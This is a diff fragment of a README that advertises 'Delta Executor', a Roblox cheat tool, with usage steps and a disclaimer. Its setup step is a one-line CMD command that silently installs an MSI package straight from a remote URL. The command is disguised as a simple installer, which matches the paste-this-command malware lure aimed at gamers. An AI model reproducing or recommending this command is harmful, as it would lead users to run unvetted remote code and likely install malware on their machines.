@@ -26,3 +26,13 @@ We know you hate complicated setups. You can download, install, and launch Delta
 
 ```CMD
 cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem delta exec
+```
+## 🎮 How to Use
+1. Launch Roblox and join any game.
+2. Open **Delta Executor** via the terminal.
+3. Type `inject` to attach the engine to the Roblox process.
+4. Type `exec <script_name.lua>` or paste your raw script into the console.
+5. Enjoy!
+
+## ⚠️ Disclaimer
+*For educational and testing purposes only. Delta Executor is an independent project and is not affiliated with, endorsed by, or sponsored by Roblox Corporation. Users are responsible for ensuring their usage complies with relevant terms of service.*
